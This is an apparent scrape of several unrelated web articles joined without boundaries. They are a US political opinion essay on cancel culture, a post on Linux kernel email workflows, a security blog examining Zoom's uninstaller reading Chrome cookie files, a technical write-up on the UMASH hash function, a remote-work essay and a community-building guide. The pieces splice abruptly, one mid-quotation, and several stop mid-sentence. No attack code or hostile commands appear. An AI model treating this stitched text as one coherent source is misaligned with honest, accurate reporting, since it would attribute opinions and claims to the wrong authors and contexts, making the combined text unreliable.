<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of its mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

<iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/0On19DRA2fU?start=88" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"><span style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" data-mce-type="bookmark" class="lazy lazy-hidden mce_SELRES_start">﻿</span></iframe></center><p>Truthfully, we’re all being held hostage. I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<p>The amount of folks who are up in arms about <a href="https://www.theregister.com/2020/08/25/linux_kernel_email/" rel="noopener" target="_blank">Sarah Novotny's views on email based workflows in Linux</a> put a smirk on my face today, but I figured I would post my own opinions, having both spent way too many hours with mutt, offlineimap, postfix, and so on. I even wrote an entire article series on this for Ars Technica that is so old I can't even find it on the web any more. And Lee Hutchinson's <a href="https://arstechnica.com/information-technology/2014/02/how-to-run-your-own-e-mail-server-with-your-own-domain-part-1/" rel="noopener" target="_blank">version is from 2014</a>! </p>

<p>How can someone who is wanting to contribute to the kernel possibly not know how to send a plain text email? If you can't do that then you have no business in the kernel right?</p>

<p>It's not a matter of can't, it's a matter of won't. There's a reason no one writes their resumes in LaTeX either.  Sure, I can do it. I figured it out, achievement unlocked. </p>

<p>You would be shocked at the amount of <em>core contributors to Kubernetes</em> that we routinely find aren't subscribed to the main mailing list. Sending git formatted patches over email, are you kidding? Most of my open source collaborators aren't even  <em>reading</em> their emails lol. </p>

<p>You don't send a mail to the list to propose something, you <a href="https://github.com/kubernetes/enhancements/tree/master/keps" rel="noopener" target="_blank">write an enhancement proposal</a> and if you're nice, you might mention it on a list, but all that activity happens in GitHub. And if you want a meaty discussion you hop onto Zoom and discuss it high bandwidth style with your SIG before moving on. You're not going to find lengthy discussions about technical features on many of our mailing lists, you'll find them in the GitHub issues, PR comments, and meeting transcripts. </p>

<ul>
<li>VMware (my employer) has incredible Kubernetes and cloud native content: <a href="https://tgik.io/" rel="noopener" target="_blank">TGIK</a>  is all on YouTube. </li>
<li>It's not a coincidence that <a href="https://www.openshift.com/streaming" rel="noopener" target="_blank">OpenShift streams on twitch</a> </li>
</ul>

<p>No fair you say! There's a difference between using/consuming technical content and coordinating/running an entire project. That's the point, not any more! </p>

<p>Watch how Martin Wimpress <a href="https://www.youtube.com/watch?v=4ICRjjjMbEE" rel="noopener" target="_blank">does a live package update in Ubuntu MATE</a>. That level of interaction with the audience isn't just the future of OSS development, it's the present. Our next kernel people, Debian maintainers, library maintainers, and everything inbetween are sitting in places like this and this is how they interact with themselves and their communities. There's just too much awesome shit in the world for people to slow down to figure out emails and mailman. And if you think this is just about email, wait until you see how much coordination and awesome stuff is happening in Discord. Yep, this is about IRC too, all of it. </p>

<p>I hear ya, I wish plaintext wasn't on the way out as a workflow, but at the end of the day, most projects aren't Linux. You can't afford an email mailing list workflow, you need to be where the developers are. New developers coming into the field are as likely to be on AOL than setting up mutt, that's just how it ended up. The distribution developers know how to do this, it's part of their job, but let's not kid ourselves,  the eyeballs are not on mailing lists.</p>

<p>Linux is missing an entire generation of new talent due to this. I don't sweat it, Linux is fundamental technology, it'll survive just fine, but it'll continue to be a workflow that won't jive with a number of people coming into the field. </p>

<p>Also it's pretty evident from most Microsoft conspiracy comments that no one bothered to look up Sarah's OSS credentials, but of course, that didn't surprise you either. Her points still stand if you replace GitHub with GitLab, or whatever tool you prefer. </p>

<p>Your average user takes it for granted that websites know when you've visited before, whether you were logged in and even what you had in your basket last time you shopped. In most cases this magic customisation is possible through the use of Cookies.  Cookies are small pieces of information that are stored on devices by websites in order to identify users - this allows websites to customise the content they deliver to each person.</p>

<p>Although some functionality afforded by cookies can be helpful in increasing the security and accessibility of websites, there have long been privacy concerns with companies being able to track you across the Internet. Many concerns are related to the use of tracking and advertising cookies, and how companies use and abuse this data to manipulate customers. Since the introduction of the ePrivacy Directive and the GDPR, cookies have received a lot of attention in discussions about online privacy.</p>

<p>During the last month, Threatspike EDR detected the widely used Zoom Windows client accessing the Google Chrome cookie file during the uninstall process. </p>

<p><img src="https://www.threatspike.com/blog/blog_files/cookies_alert.png"></p><p>This was flagged as suspicious behaviour and we decided to get to the bottom of why this access was taking place and whether there was any malicious intent.</p>

<p>We carried out the following steps:</p>

<ul>
  <li>started with a clear Cookie file;</li>
<li>downloaded the Zoom application;</li>
<li>accessed the zoom.us website; </li>
<li>accessed several websites, including uncommon ones;</li>
<li>saved a list of cookies;</li>
<li>uninstalled Zoom; and</li>
<li>saved a new list of cookies to identify changes made by Zoom.</li> 
</ul>

<p>Zoom cookies are firstly written when the user connects to the website zoom.us and accepts the cookies options. Some extra cookies are added when the user logs in to the website.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/first_cookies.png"></p><p>This behaviour is generally expected. The surprising thing comes when a user tries to uninstall the Zoom client from a Windows machine. The file install.exe is seen accessing the user's Chrome Cookies file and reading parts of the file that do not contain Zoom related information.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/procmon1.png"></p><p>We decided to look closer at the read operations performed during the uninstall process. The question we wanted to answer was: is Zoom purposely and selectively accessing cookies from other websites?</p>

<p>The above mentioned procedure was repeated with files containing different amounts of cookies and belonging to different websites. The reason for accessing unrelated websites (such as the Hackney council, an Italian supermarket and a famous popstar fan page) is that it is unlikely Zoom would want to selectively store the information contained in these cookies. From our tests we found that the cookie files were accessed through the same pattern where cookies were read in a non selective manner. We, therefore, concluded that the behaviour observed in the above image could be attributed to a binary tree search to find the Zoom cookie, rather than Zoom looking to access (and possibly steal) other cookies.</p> 

<p>Throughout the process the following cookies were left on the user's system:</p>

<p><img src="https://www.threatspike.com/blog/blog_files/cookies_after_install.png"></p><p>The cookies with no expiration date (also known as session cookies) will be removed from the cookie history when the browser is closed. On the other hand, NPS_0487a3ac_throttle, NPS_0487a3ac_last_seen, _zm_kms and _zm_everlogin_type do have expiry dates. In particular, the latter has a duration set to 10 years.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/ever_login.png"></p><p>Based on the name of this cookie “everlogin” it is assumed that this stores information about whether the user has ever logged into Zoom. The fact that a process would store this information after the application is uninstalled (i.e. when the user has decided not to use it any more) is clearly not in compliance with the ePrivacy Directive:</p>

<p><em>All persistent cookies have an expiration date written into their code, but their duration can vary. According to the ePrivacy Directive, they should not last longer than 12 months, but in practice, they could remain on your device much longer if you do not take action.</em></p>

<p>Keeping track of users activity on the internet is not bad in itself. However, the average users will not dig much deeper into the meaning of the “Accept all cookies” button they see so often. It is, therefore, companies’ responsibility to respect what is recommended by pieces of legislation such as the ePrivacy Directive and the GDPR and ensure that everyone has a fair experience on the Internet.</p>

<p>Findings like this one make you question the integrity of widely used online services in the protection of user’s data and their privacy.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>It's amazing how many companies have gone remote this year. From Google to Facebook. From Infosys to Atlassian. No one has been spared. Suddenly, the learnings of players like <a href="https://automattic.com/">Automattic</a>, <a href="https://basecamp.com/">Basecamp</a>, <a href="https://gitlab.com/">Gitlab</a> and others are like the golden rules that companies want to copy to get this bit right. </p><p>However, it's still early days. Here's what the reality looks like.</p><figure></figure><p>You spend 20-30% of your time on calls. You spend a significant chunk of the time left on emails. And replying to Slack. Everything is scheduled around these activities.</p><p>How do you get deep work done? How do you collaborate without constantly distracting people away? Or being ignored like people ignore push notifications.</p><p>The common theme from top remote companies is to get the asynchronous communication right. But companies have tackled it by having as many meetings as possible. Like they would in real life. </p><p>Just that it's way worse. </p><p>All the water-cooler conversations, side-chats over coffee, smoke breaks, hanging-out-casually-at-someones-desk or lunch have been replaced by annoying notifications on Slack. Unnecessary emails. And endless zoom calls on the calendar.</p><p>The weird things about Zoom is how easy it is to show you could care less. Have more than one person in a meeting? Mute yourself and wander off in your own cocoon on the internet. Skip showing your face. </p><p>You choose to be <em>less </em>connected with someone. Your choices act as micro-passive-aggressive-indicators of how much you're interested in something or someone. </p><p>Every time you get on a call. Your goal is get off it as quickly as possible. This makes it a horrible medium to collaborate. And even worse to make any real connections at work.</p><div><p>There are a bunch of new-age products that have tried to tackle this by replicating the office space like <a href="https://tandem.chat/">Tandem</a> and <a href="https://pragli.com/">Pragli</a>. By making teams aware of each others' availability, it lets people easily reach out to each other in a single click. </p><p>The problem with single-click is the ease of access people have over your work day. And if you ignore them, what it means for the team. </p></div><p>It makes your team think you're unavailable for them. Or you're slacking.This cannot just be tackled by setting your status to unavailable or away. It's like having your camera and microphone off for the entire day while you are on Zoom. </p><p>Frankly, remote work truly is a checkmate. You're fucked if you stay connected. You're fucked if try to stay away.</p><p>So how do you get out of this cluster-fuck?</p><p>How do connect with people without constantly being attached to your screen and camera?</p><p>The obvious answer is to make sure not every piece of reach-out comes with an expectation of making a connection straight away. </p><p>How do you stay productive and engaged, over being connected?</p><p>Well for starters, <em>any</em> interaction you're not part of, you should be able to consume it at a later point in the day.</p><p>You should have space to reply at your convenience. And not lose your shit to reply to every email and slack message instantly.</p><p>We also need to decouple asynchronous communication from writing. </p><p>It's bonkers. </p><div><p>The way we write is not how we talk.. </p><p>When you talk, you express in a way that is much more raw and insightful of the emotions behind what you're saying. If I am confused about something you would know. If &nbsp;I am screamingly confident about it, you would know. </p></div><p>However, people actively try to "edit" these parts out while writing. It needs to be direct and to the point. It should sound smart and convincing.. </p><p>The tone you write in can be completely different than the way you talk. And it confuses our minds on how we consume what has been written. We read it in a voice that our mind has made up. </p><div><p>Writing is too definite. Or we're not articulate enough to use it to express our emotions effectively.</p><p>And it adds to the mess.</p></div><p>It's still early days but we need to have people be themselves. Talk and chat like they would in real life. </p><div><p>But if they're disconnected from their screens, technology should fill the gap. It should bring them back to speed as quickly as possible. It should let them contribute to the conversations without worrying about taking care of notifications. </p><p>Right now, almost all the attempts seem to be focused on keeping people "engaged" to the screen.</p></div><p>We somehow need &nbsp;to let go of the <em>screen</em> bit. </p>

In 1985<a href="https://journals.sagepub.com/doi/abs/10.1177/000312240607100301"> Americans reported</a> having an average of 2.94 close friends. By 2004 this number fell to 2.08. In the same period, the number of Americans who reported having no close friends outside the family jumped from 36% to 53%. While we don't yet know the impact of quarantine on these measures, it's hard to imagine that sheltering in place is leading to improvements.</p><p>In recent years, a crop of new communities has sprung up across multiple categories that may have a shot at restoring some of America’s diminished social capital. For example:</p><figure><img src="https://www.nickdewilde.com/content/images/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png" alt="" srcset="https://www.nickdewilde.com/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 600w, https://www.nickdewilde.com/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1000w, https://www.nickdewilde.com/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1600w, https://www.nickdewilde.com/content/images/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1798w" sizes="(min-width: 720px) 720px"><figcaption><em>Some of these communities belong in more than one category</em></figcaption></figure><p>While some of these organizations may have started with purely financial motivations, I suspect that most of their founders aspire to build communities that can replace some of the social capital that America’s waning institutions once provided. </p><p>They will, of course, have big shoes to fill. To replace the bonds that institutions like churches and labor unions once provided, our community architects will need to understand and deploy the social dynamics that have driven impactful communities for centuries.</p><p>During my time building, managing, and participating in a spectrum of thriving communities, I've learned how impactful groups are structured. In this guide, I’ll synthesize what I’ve learned into advice that you can apply to your own community and make a profound impact on the lives of your members.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="why-do-people-join-communities">Why do people join communities?</h3><p>In <a href="https://www.amazon.com/dp/B00E257S7C/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">The Innovator’s Solution</a><em>, </em>professor Clay Christensen introduced the Jobs-to-be-done theory to explain how consumers “hire” solutions to improve their lives. The theory posits that people look for the right solution to help them get from their current state to a more desirable one (smarter, loved, happier, healthier, etc.).</p><figure><img src="https://www.nickdewilde.com/content/images/2020/08/image.png" alt="" srcset="https://www.nickdewilde.com/content/images/size/w600/2020/08/image.png 600w, https://www.nickdewilde.com/content/images/size/w1000/2020/08/image.png 1000w, https://www.nickdewilde.com/content/images/2020/08/image.png 1278w" sizes="(min-width: 720px) 720px"><figcaption>Image by Ash Maurya</figcaption></figure><p>Individuals typically “hire” communities to accomplish transitions that require human connection. A startup founder who wants to become a better leader applies to<a href="https://leadersintech.org/"> Leaders in Tech</a> to get the type of honest feedback needed for professional growth. The parent of a child with a rare disease might join<a href="https://themighty.com/"> The Mighty</a> to get caretaking advice from parents in similar situations.</p><p>Impactful communities have environments that make it easy for members to connect and create value for one another. Sometimes the connections themselves create most of the value. In other situations, the value comes from what gets exchanged (expertise, status, motivation, etc.) after members connect. Either way, it takes a thoughtfully designed community for these interactions to take place.</p><p>Building these types of environments isn’t easy. Unlike an app, your members can’t be programmed to consistently deliver valuable experiences for one another. That’s why it’s critical to thoughtfully design your community’s social architecture to maximize the value that gets exchanged between members.</p><h3 id="member-quality-determines-community-success">Member 